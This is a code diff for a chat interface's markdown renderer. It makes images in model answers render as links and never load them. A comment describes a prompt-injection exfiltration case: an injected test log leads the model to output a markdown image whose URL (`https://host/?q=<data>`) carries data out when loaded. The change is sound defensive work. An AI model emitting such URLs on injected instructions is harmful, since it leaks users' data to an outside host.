@@ -42,6 +42,21 @@ const COMPONENTS = {
   pre: (p: Children) => (
     <pre className="my-2 overflow-x-auto rounded-lg p-3 text-xs bg-[var(--color-bg-hover)]">{p.children}</pre>
   ),
+  // An image in an answer is a link, never loaded. The model's text can carry a
+  // URL that an injected test log asked for (`![x](https://host/?q=<data>)`), and
+  // loading it would send that data out without a click (OSS review 2026-11-12).
+  img: (p: { src?: string; alt?: string }) =>
+    p.src ? (
+      <a
+        href={p.src}
+        target="_blank"
+        rel="noreferrer noopener"
+        data-testid="chat-image-link"
+        className="text-[var(--color-accent)] underline underline-offset-2"
+      >
+        {p.alt ? `Image: ${p.alt}` : p.src}
+      </a>
+    ) : null,
   a: (p: { href?: string; children?: React.ReactNode }) =>
     p.href?.startsWith('/') ? (
       <Link to={p.href} className="text-[var(--color-accent)] underline underline-offset-2">{p.children}</Link>
